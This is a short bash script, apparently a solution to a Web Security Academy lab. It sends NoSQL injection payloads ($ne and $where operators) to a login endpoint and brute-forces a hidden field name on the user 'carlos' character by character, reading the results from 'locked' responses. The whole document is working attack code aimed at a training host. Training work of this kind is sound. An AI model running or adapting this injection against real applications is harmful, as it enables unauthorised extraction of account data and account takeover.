#!/bin/bash
alphabet=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
index=01234567890123456789
for (( j=0; j<${#index}; j++ )); do
  for (( i=0; i<${#alphabet}; i++ )); do
    char="${alphabet:$i:1}"
    if [[ $(curl  --header "Content-Type: application/json" -s https://0ab900a603038c0680c0eee600eb00c6.web-security-academy.net/login --data "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"invalid\"}, \"\$where\":\"Object.keys(this)[$1].match('^.{$j}$char.*')\"}" | grep locked) ]]; then
      echo "field[$j] = $char"
      break
    fi
  done
done
